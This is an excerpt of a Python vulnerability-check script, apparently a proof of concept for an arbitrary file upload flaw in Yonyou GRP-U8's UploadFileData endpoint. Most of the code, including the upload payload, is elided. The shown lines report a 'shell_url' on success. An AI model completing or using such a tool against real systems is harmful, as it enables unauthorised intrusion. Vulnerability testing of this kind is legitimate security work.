...
def main(target_url):
    ...
    if target_url[-1] != '/':
        target_url += '/'
    print(now_time() + ' [INFO]     正在检测用友 GRP-U8 UploadFileData 任意文件上传漏洞')
...
------WebKitFormBoundary92pUawKc--'''
    try:
        ...
        if response.status_code == 200 and "123" in response.text:
            print(
                now_time() + " [SUCCESS]  用友 GRP-U8 UploadFileData 任意文件上传漏洞，测试URL为: {}".format(shell_url))
        else:
            print(now_time() + " [WARNING]  用友 GRP-U8 UploadFileData 任意文件上传漏洞不存在")
    except:
